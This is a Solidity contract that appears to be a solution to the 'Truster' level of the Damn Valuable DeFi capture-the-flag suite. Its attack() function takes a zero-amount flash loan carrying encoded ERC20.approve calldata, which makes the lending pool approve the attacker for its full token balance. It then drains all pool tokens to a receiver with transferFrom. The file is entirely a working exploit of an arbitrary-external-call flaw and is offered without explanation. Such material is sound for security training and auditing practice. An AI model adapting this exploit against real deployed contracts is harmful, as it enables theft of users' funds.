// SPDX-License-Identifier: MIT

pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

contract Truster{
    TrusterLenderPool public trusterLenderPool;
    DamnValuableToken public token;

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    function attack(TrusterLenderPool _trusterLenderPool, DamnValuableToken _token, address receiver) public{
        trusterLenderPool = _trusterLenderPool;
        token = _token;
        
        bytes memory call = abi.encodeCall(ERC20.approve,(address(this),TOKENS_IN_POOL));
        trusterLenderPool.flashLoan(0, address(this), address(token), call);

        token.transferFrom(address(trusterLenderPool), receiver, TOKENS_IN_POOL);
    }
}